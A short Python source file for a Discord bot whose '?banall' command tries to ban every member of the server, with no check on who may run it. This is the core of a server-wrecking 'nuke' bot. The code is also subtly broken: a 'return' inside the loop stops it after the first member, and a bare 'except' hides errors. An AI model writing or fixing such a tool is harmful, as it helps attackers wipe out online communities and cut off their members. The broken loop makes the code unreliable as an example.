import discord
from discord.ext import commands


client = commands.Bot(command_prefix="?", intents = discord.Intents.all())


@client.command()
async def banall(ctx):
  for member in ctx.guild.members:
    try:
      await member.ban()
      print(f"Banned {member}")
    except:
      print(f"Couldnt ban {member}")
    
    return
  
  
client.run("bot token")